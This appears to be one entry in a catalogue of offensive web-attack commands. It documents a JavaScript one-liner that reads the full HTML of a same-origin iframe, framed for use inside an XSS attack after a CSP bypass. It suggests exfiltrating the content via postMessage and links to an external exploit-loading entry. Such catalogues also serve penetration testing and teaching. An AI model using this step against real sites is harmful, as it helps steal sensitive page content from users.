---
data: 'parent.frames[0].document.body.innerHTML'
tags:
  - leakage
  - dom
type: command
output: HTML string
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:44.148Z'
id: cdb70f95-6124-480c-bc03-40d2263ee48c
verified: false
validated: true
submitted: true
---
# iframe-content-leakage

## Command

```javascript
parent.frames[0].document.body.innerHTML
```

## Description

Accesses and extracts full HTML from a same-origin iframe for content leakage post-CSP bypass.

## Parameters

None.

## Examples

### Basic Usage

```javascript
// In XSS context after iframe load
const leaked = parent.frames[0].document.body.innerHTML;
console.log(leaked); // Or exfil
```

### Advanced Usage

Combine with postMessage for external send.

## Expected Output

Complete body HTML including sensitive data.

## Related

- [[commands/load-external-exploit-script]]
